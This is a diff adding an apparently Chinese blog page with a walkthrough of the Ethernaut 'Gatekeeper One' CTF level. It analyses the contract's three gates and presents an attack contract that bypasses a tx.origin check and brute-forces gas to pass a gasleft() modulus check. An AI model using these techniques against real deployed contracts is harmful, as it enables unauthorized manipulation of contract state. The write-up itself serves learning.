@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
+  
+  
+  <title>
+    
+      13.Gatekeeper One 
+      
+      
+      |
+    
+     solidity life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0">
+    <link rel="icon" href="https://moe.photo/images/2023/04/27/8ff41b601961ed09f3e711eea7a3ec1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://moe.photo/images/2023/04/27/8ff41b601961ed09f3e711eea7a3ec1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">LEVI_104</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">13.Gatekeeper One</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-06-23 20:21:59
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/04-Ethernaut-CTF/" title="04.Ethernaut CTF">
+                    <b>#</b> 04.Ethernaut CTF
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a><strong>Gatekeeper One</strong></h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：修改entrant，即：成功调用<code>enter(bytes8 _gateKey)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本道题要我们成功调用<code>enter(bytes8 _gateKey)</code>，那么就需要通过三个修饰器<code>gateOne</code>，<code>gateTwo</code>和<code>gateThree(_gateKey)</code>的检验。</p>
+<h3 id="gateOne"><a href="#gateOne" class="headerlink" title="gateOne"></a>gateOne</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>这里需要我们理解msg.sender和tx.origin的区别。意思是要求：我们不可以直接调用，需要写一个合约进行调用</p>
+<p><img src="https://moe.photo/images/2022/12/24/-2022-12-24-010131.jpg" alt></p>
+<h3 id="gateTwo"><a href="#gateTwo" class="headerlink" title="gateTwo"></a>gateTwo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier gateTwo() &#123;</span><br><span class="line">   require(gasleft() % 8191 == 0);</span><br><span class="line">   _;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p><code>gasleft()</code>：是solidity的内置方法，方法返回此次交易我们还剩余多少gas。returns (uint256)</p>
+<p>意思是，当程序执行到<code>require(gasleft() % 8191 == 0)</code>这一步时，交易所剩的gas取模8191的值为0，那么我们有两个思路来通过这个修饰器：暴力尝试和通过debug来查看gas消耗情况</p>
+<h4 id="暴力尝试"><a href="#暴力尝试" class="headerlink" title="暴力尝试"></a>暴力尝试</h4><p>gas的剩余量取模8191的结果为0，那么暴力尝试的可能性就只有8191种，那么我们可以做一个循环，从0gas开始到8191gas进行调用方法，总有一次可以通过此修饰器，很有意思的是，网络上有大佬优化了这个暴力尝试的过程（attack方法是网上大佬的思路，attack_是真正的暴力破解）</p>
+<p>【网络版本】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 为什么这么写呢？因为有玩家通过测试，本关这里的gas大概在210次</span><br><span class="line">// 然后他取了一个缓冲值60上下浮动，即：210加减60=&gt;150~270</span><br><span class="line">// 那么，他就打算从gas=150开始循环</span><br><span class="line">// 最多到270次就收手，这就是120的由来：270-150=120</span><br><span class="line">for (uint256 i = 0; i &lt; 120; i++) &#123;</span><br><span class="line">          (bool result,) = address(gatekeeperOne).call&#123;gas:i + 150 + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">          if (result) &#123;</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p>【未知情况，真正暴力破解版本】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class="line">          // 乘3原因：气体最低限制21000，低于这个值就很可能call调用失败。因此*3就大于21000，你可以乘任何&gt;=3的值</span><br><span class="line">          // i从0开始，不断尝试，理论上最多有8191种可能，肯定能试出来。</span><br><span class="line">          // 一旦试出来，result返回true，就可以退出循环了</span><br><span class="line">          (bool result,) = address(gatekeeperOne).call&#123;gas:i + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">          if (result) &#123;</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<h4 id="debug查看"><a href="#debug查看" class="headerlink" title="debug查看"></a>debug查看</h4><p>目的是通过<code>require(gasleft() % 8191 == 0);</code>的检验，那么我们可以debug到gasleft()操作码，它的操作码是GAS，GAS执行完之后剩余的gas就是 <code>X % 8191</code> 的值X。我们的需求就是X是8191的倍数。</p>
+<p>solidity代码和交易中，执行同一个方法，操作码是不变的，那么我们代码执行到GAS操作码所消耗的gas就是定值。我们可以把这个定值找出来，然后加上8191的倍数，就可以通过此处的检验。</p>
+<p>所以我们先设置一个较大的gas执行，看看执行到GAS操作码之后，消耗了多少gas</p>
+<p>但是遇到了问题，我的remix页面debug不到GAS操作码。原因：remix需要Ethersccan测试网的API，且追踪一个已经验证的合约，才可以进入debug。如下图设置一下：</p>
+<p><img src="https://moe.photo/images/2022/12/25/image-20221225003946338.png" alt></p>
+<p>【1】gas设置为100000</p>
+<p><img src="https://moe.photo/images/2022/12/25/UBQAND45K5X4O4AUX60.png" alt></p>
+<p><img src="https://moe.photo/images/2022/12/25/2.png" alt></p>
+<p>71874=8191*8+6346<br>100000-6346=93654</p>
+<p><img src="https://moe.photo/images/2022/12/25/3.png" alt></p>
+<p><img src="https://moe.photo/images/2022/12/25/4.png" alt></p>
+<p>65627=8191*8+99<br>93654-99=93555</p>
+<p><img src="https://moe.photo/images/2022/12/25/5.png" alt></p>
+<p>65529=8191*8+1<br>93555-1=93554</p>
+<p><img src="https://moe.photo/images/2022/12/25/6.png" alt></p>
+<p>通过</p>
+<p><img src="https://moe.photo/images/2022/12/25/image-20221225135209068.png" alt></p>
+<p>奇怪的是：我的代码从始至终都没有变，gas设置为100000。然后交易的时候gas设置为100000=&gt;93654=&gt;93555=&gt;93544。最终在93544成功。我保证我每一次计算都是正确的，然而每次发送交易的时候，执行到GAS操作码的时候remain gas的值都会变化。只有93555=&gt;93544的时候固定消耗gas才保持不变。<br>因此，我认为，就算同一个代码，发送交易的时候设置的gas不一致，那么程序执行的时候操作码消耗的gas也会产生变化？只有一些特定的不同gas值才会消耗相同的gas。即：gas上限的设置也会影响操作码的gas消耗，只是有些时候比较幸运不会产生变化【就比如本题的93555和93554固定消耗gas相同，而100000、93654、93555他们三者不同的gas上限设置也会导致固定消耗不同】<br>因此，我推断：交易的时候gas上限的设置也会影响实际gas的消耗情况，只是这个情况比较特殊，而有些gas就不会影响gas消耗。而这个特殊的情况就是我们本题需要找的值</p>
+<p>而且，在call语句设置的gas似乎是没用的，程序只看交易的时候设置的gas上限。本题我的代码的call的gas一直是100000，然后交易的时候，gas交易上限不断改变，到了GAS操作码的时候remain gas也会产生变化</p>
+<blockquote>
+<p>！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</p>
+<p>录制了一个debug解题的<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1214y1P7Gi/?spm_id_from=333.999.0.0&amp;vd_source=0cc0401ee122346d6680e90658b0ed1a">视频</a>，里面阐述了做题过程和疑问</p>
+</blockquote>
+<h3 id="gateThree-gateKey"><a href="#gateThree-gateKey" class="headerlink" title="gateThree(_gateKey)"></a>gateThree(_gateKey)</h3><p>想要通过这个修饰器检验，我们得先了解一下solidity中类型截断、保留、补位的规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>空讲很难理解，用一个例子来解释吧。传入的是bytes8，那么就假如传入的是：0x11112222aaaabbbb</p>
+<ol>
+<li>第一个require：<code>uint32(uint64(_gateKey))</code>从低位截取，变成0xaaaabbbb。<code>uint16(uint64(_gateKey))</code>从低位截取，变成0xbbbb。根据solidity的规则，uint32和uint16在比较的时候，较小的类型uint16会在高位补0至位数和较大类型uint32一致，即：0x0000bbbb和0xaaaabbbb比较。因此，我们的参数<code>_gateKey</code>得是一个xxxxxxxx0000xxxx类型的数值。</li>
+<li>第二个require：<code>uint64(_gateKey)</code>是保留所有位，而<code>uint32(uint64(_gateKey))</code>保留低32位。两者低32位是一模一样的，要通过require，则需要高32位任意一位不一致即可，因为<code>uint32(uint64(_gateKey))</code>高32位全部为0，那么我们传入的参数高32位至少需要一位数不为0。因此，我们的参数<code>_gateKey</code>可以是一个FFFFFFFF0000xxxx类型的数值。</li>
+<li>第三个require：目前我们确定参数<code>_gateKey</code>可以是一个FFFFFFFF0000xxxx类型的数值。那么<code>uint32(uint64(_gateKey))</code>之后的结果就是0000xxxx。<code>uint16(uint160(tx.origin))</code>是对钱包地址进行操作，数值类型从低位开始截取，即<code>uint16(uint160(tx.origin))</code>的结果是我们钱包地址的后16位，就是后面4个数，对于我来说为97c6。那么这个<code>_gateKey</code>就确定下来了，可以为：FFFFFFFF000097c6。（前8个F是可变的，0000是雷打不动的，97c6根据自己的钱包而定）</li>
+</ol>
+<h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">  GatekeeperOne gatekeeperOne = GatekeeperOne(0x133636510C89C2075813d4Aba991A44B5A85aA97);</span><br><span class="line"></span><br><span class="line">  function attack() public &#123;</span><br><span class="line">    bytes8 key = 0xFFFFFFFF000097c6;</span><br><span class="line">      // 网络版本</span><br><span class="line">      // 为什么这么写呢？因为有玩家通过测试，本关这里的gas的i大概在210次</span><br><span class="line">      // 然后他取了一个缓冲值60上下浮动，即：210加减60=&gt;150~270</span><br><span class="line">      // 那么，他就打算从gas=150开始循环</span><br><span class="line">      // 最多到270次就收手，这就是120的由来：270-150=120</span><br><span class="line">      for (uint256 i = 0; i &lt; 120; i++) &#123;</span><br><span class="line">          (bool result,) = address(gatekeeperOne).call&#123;gas:i + 150 + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">          if (result) &#123;</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack_() public &#123;</span><br><span class="line">    bytes8 key = 0xFFFFFFFF000097c6;</span><br><span class="line">      //未知版本</span><br><span class="line">      for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class="line">          // 乘3原因：气体最低21000，低于这个值就很可能call调用失败。因此*3就大于21000，你可以乘任何&gt;=3的值</span><br><span class="line">          // i从0开始，不断尝试，理论上最多有8191种可能，肯定能试出来。</span><br><span class="line">          // 一旦试出来，result返回true，就可以退出循环了</span><br><span class="line">          (bool result,) = address(gatekeeperOne).call&#123;gas:i + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">          if (result) &#123;</span><br><span class="line">              break;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>两次获取题目，attack和attack_都试一次，看看是不是都可以暴力破解。答案：都成功</p>
+<p><img src="https://moe.photo/images/2022/12/24/image-20221224001226714.png" alt></p>
+<p>通过</p>
+<p><img src="https://moe.photo/images/2022/12/24/image-20221224000933198.png" alt></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/06/23/04.Ethernaut%20CTF/12.Privacy/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-06-23 20:21:59
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/04-Ethernaut-CTF/" title="04.Ethernaut CTF">
+                        <b>#</b> 04.Ethernaut CTF
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/06/23/04.Ethernaut%20CTF/14.Gatekeeper%20Two/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Gatekeeper-One"><span class="toc-text">Gatekeeper One</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gateOne"><span class="toc-text">gateOne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gateTwo"><span class="toc-text">gateTwo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E5%B0%9D%E8%AF%95"><span class="toc-text">暴力尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#debug%E6%9F%A5%E7%9C%8B"><span class="toc-text">debug查看</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gateThree-gateKey"><span class="toc-text">gateThree(_gateKey)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6"><span class="toc-text">攻击合约</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9A%E9%A2%98"><span class="toc-text">做题</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 13.Gatekeeper%20One + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F06%2F23%2F04.Ethernaut%2520CTF%2F13.Gatekeeper%2520One%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/06/23/04.Ethernaut%20CTF/13.Gatekeeper%20One/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
